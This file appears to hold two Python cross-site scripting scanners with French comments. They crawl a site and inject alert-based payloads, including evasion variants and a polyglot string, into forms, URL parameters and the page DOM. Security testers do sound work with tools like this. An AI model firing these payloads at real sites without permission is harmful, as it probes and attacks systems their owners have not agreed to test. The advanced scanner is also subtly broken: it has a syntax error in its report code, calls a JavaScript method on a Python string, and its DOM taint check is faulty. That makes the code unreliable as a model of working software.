import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerable_points = []

    # Payloads XSS de test
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert(1)</script>',
        'javascript:alert("XSS")',
        '<svg/onload=alert("XSS")>'
    ]

    def scan(self):
        # Analyse initiale de la page
        response = self.session.get(self.target_url)
        soup = BeautifulSoup(response.content, 'html.parser')

        # Recherche de tous les formulaires
        forms = soup.find_all('form')
        print(f"[+] Found {len(forms)} forms on {self.target_url}")

        for form in forms:
            self.test_form(form)

    def test_form(self, form):
        # Extraction des détails du formulaire
        details = {}
        action = form.get('action')
        url = urljoin(self.target_url, action)
        method = form.get('method', 'get').lower()

        # Collecte des inputs
        inputs = form.find_all('input')
        form_data = {}
        for input_tag in inputs:
            name = input_tag.get('name')
            type_ = input_tag.get('type', 'text')
            if name:
                form_data[name] = 'test' if type_ != 'submit' else ''

        # Test pour chaque payload
        for payload in self.xss_payloads:
            data = {}
            for field in form_data:
                data[field] = payload

            if method == 'post':
                res = self.session.post(url, data=data)
            else:
                res = self.session.get(url, params=data)

            # Vérification de la réflexion
            if payload in res.text:
                print(f"[!] Potential XSS found in {url}")
                print(f"    Payload: {payload}")
                print(f"    Form fields: {list(form_data.keys())}\n")
                self.vulnerable_points.append({
                    'url': url,
                    'payload': payload,
                    'fields': form_data
                })

    def report(self):
        print("\nScan Report:")
        for vuln in self.vulnerable_points:
            print(f"URL: {vuln['url']}")
            print(f"Payload: {vuln['payload']}")
            print("Affected Fields:")
            for field in vuln['fields']:
                print(f" - {field}")
            print("-" * 50)

if __name__ == "__main__":
    scanner = XSSScanner('http://vulnerable-site.com')
    scanner.scan()
    scanner.report()
    
    
import requests
from bs4 import BeautifulSoup, Comment
from urllib.parse import urlparse, urljoin, parse_qs
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import json
import hashlib
import re
import threading
import time
from collections import OrderedDict

class AdvancedXSSScanner:
    def __init__(self, target_url, headless=True):
        self.target_url = target_url
        self.base_url = urlparse(target_url).scheme + "://" + urlparse(target_url).netloc
        self.session = requests.Session()
        self.vulnerabilities = []
        self.checked_forms = set()
        self.checked_urls = set()
        self.waf_detected = False
        self.driver = self.init_selenium(headless)
        self.lock = threading.Lock()
        
        # Configuration
        self.scan_depth = 2
        self.timeout = 10
        self.max_threads = 5
        self.rate_limit = 1.0  # Seconds between requests
        
        # Enhanced payload list with context-specific vectors
        self.payloads = self.load_payloads()
        
    def init_selenium(self, headless):
        options = webdriver.ChromeOptions()
        if headless:
            options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        return webdriver.Chrome(options=options)

    def load_payloads(self):
        # Multi-context payloads with evasion techniques
        return {
            'html': [
                '<svg/onload=alert("XSS")>',
                '<img src=x onerror=alert(document.domain)>',
                '<details open ontoggle=alert(1)>'
            ],
            'attribute': [
                '" autofocus onfocus=alert(1)',
                'javascript:alert(1)//',
                ' onmouseover=alert(1)'
            ],
            'script': [
                '</script><script>alert(1)</script>',
                '${alert(1)}',
                ';alert(1)'
            ],
            'polyglot': [
                'jaVasCript:/*-/*`/*\`/*\'/*"/**/(alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e'
            ]
        }

    def scan(self):
        self.crawl_and_spider()
        self.driver.quit()
        self.generate_report()

    def crawl_and_spider(self):
        queue = [(self.target_url, 0)]
        while queue:
            url, depth = queue.pop(0)
            if depth > self.scan_depth or url in self.checked_urls:
                continue
            
            self.checked_urls.add(url)
            
            # Static analysis
            response = self.session.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Dynamic analysis with Selenium
            self.dynamic_analysis(url)
            
            # Test parameters in URL
            self.test_url_parameters(url)
            
            # Extract forms and test
            forms = soup.find_all('form')
            for form in forms:
                form_hash = hashlib.md5(str(form).encode()).hexdigest()
                if form_hash not in self.checked_forms:
                    self.checked_forms.add(form_hash)
                    self.test_form(form, url)
            
            # Find new links
            for link in soup.find_all('a', href=True):
                absolute_url = urljoin(self.base_url, link['href'])
                if absolute_url not in self.checked_urls:
                    queue.append((absolute_url, depth + 1))

    def dynamic_analysis(self, url):
        try:
            self.driver.get(url)
            WebDriverWait(self.driver, self.timeout).until(
                EC.presence_of_element_located((By.TAG_NAME, 'body'))
            )
            
            # Test DOM XSS
            self.test_dom_xss()
            
            # Test event handlers
            self.execute_script_with_payloads()
            
        except Exception as e:
            print(f"Dynamic analysis error: {str(e)}")

    def test_dom_xss(self):
        sources = ['location.hash', 'document.cookie', 'window.name']
        sinks = [
            'innerHTML',
            'document.write',
            'eval',
            'setTimeout',
            'setInterval'
        ]
        
        # Build payload to detect taint propagation
        payload = "1;console.log('XSS_TAINT');"
        for source in sources:
            for sink in sinks:
                script = f"""
                var tainted = {source};
                {sink}(tainted);
                """
                self.driver.execute_script(script.replace("tainted", payload))
                if self.check_console_output('XSS_TAINT'):
                    print(f"Potential DOM XSS via {source} -> {sink}")

    def execute_script_with_payloads(self):
        for payload in self.payloads['polyglot']:
            try:
                self.driver.execute_script(f"document.body.innerHTML += '{payload}';")
                time.sleep(1)
                if self.driver.execute_script("return document.body.innerHTML").includes(payload):
                    self.log_vulnerability("DOM-based XSS", payload)
            except:
                pass

    def test_url_parameters(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            thread = threading.Thread(
                target=self.test_parameter,
                args=(url, param, 'GET')
            )
            thread.start()

    def test_form(self, form, url):
        action = form.get('action') or url
        method = form.get('method', 'get').lower()
        inputs = form.find_all(['input', 'textarea', 'select'])
        
        data = {}
        for inp in inputs:
            name = inp.get('name')
            if name and inp.get('type') != 'submit':
                data[name] = self.generate_attack_vector(name)

        # Test with various content types
        content_types = ['application/x-www-form-urlencoded']
        if any(inp.get('type') == 'file' for inp in inputs):
            content_types.append('multipart/form-data')
        
        for ct in content_types:
            self.send_requests(action, method, data, ct)

    def generate_attack_vector(self, field_name):
        # Context-aware payload generation
        vectors = []
        vectors.extend(self.payloads['html'])
        vectors.extend(self.payloads['attribute'])
        vectors.extend(self.payloads['polyglot'])
        return vectors

    def send_requests(self, url, method, data, content_type):
        headers = {'Content-Type': content_type}
        
        for payload in self.generate_attack_vector(None):
            cloned_data = {k: payload for k in data}
            
            try:
                if method == 'post':
                    response = self.session.post(url, data=cloned_data, headers=headers)
                else:
                    response = self.session.get(url, params=cloned_data)
                
                self.analyze_response(response, payload)
                time.sleep(self.rate_limit)
                
            except Exception as e:
                print(f"Request error: {str(e)}")

    def analyze_response(self, response, payload):
        # Advanced reflection detection with context analysis
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Check different contexts
        contexts = {
            'html_content': soup.find_all(string=re.compile(re.escape(payload))),
            'attributes': [attr for tag in soup.find_all() 
                          for attr in tag.attrs.values() 
                          if payload in str(attr)],
            'comments': [comment for comment in soup.find_all(string=lambda t: isinstance(t, Comment)) 
                        if payload in comment]
        }
        
        # Contextual validation
        for context_type, matches in contexts.items():
            for match in matches:
                if self.is_payload_executable(payload, context_type, str(match)):
                    self.log_vulnerability(context_type, payload)

    def is_payload_executable(self, payload, context_type, context_content):
        # Advanced context analysis
        if context_type == 'html_content':
            return re.search(r'<\/?[a-z]', context_content)
        elif context_type == 'attributes':
            return re.search(r'on\w+=|javascript:', context_content)
        elif context_type == 'comments':
            return '-->' not in context_content
        
        return False

    def log_vulnerability(self, context, payload):
        with self.lock:
            vuln = {
                'url': self.driver.current_url,
                'payload': payload,
                'context': context,
                'severity': 'High',
                'evidence': self.get_page_snapshot()
            }
            self.vulnerabilities.append(vuln)

    def get_page_snapshot(self):
        return {
            'html': self.driver.page_source[:1000],
            'cookies': self.driver.get_cookies(),
            'console': self.driver.get_log('browser')
        }

    def generate_report(self):
        report = {
            'target': self.target_url,
            'scan_date': time.ctime(),
            'vulnerabilities': self.vulnerabilities,
            'stats': {
                'pages_crawled': len(self.checked_urls),
                'forms_tested': len(self.checked_forms),
                'payloads_tested': sum(len(v) for v in self.payloads.values()))
            }
        }
        
        with open('xss_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"Report generated with {len(self.vulnerabilities)} findings.")

# Exemple d'utilisation
if __name__ == "__main__":
    scanner = AdvancedXSSScanner('http://vuln-lab.example', headless=True)
    scanner.scan()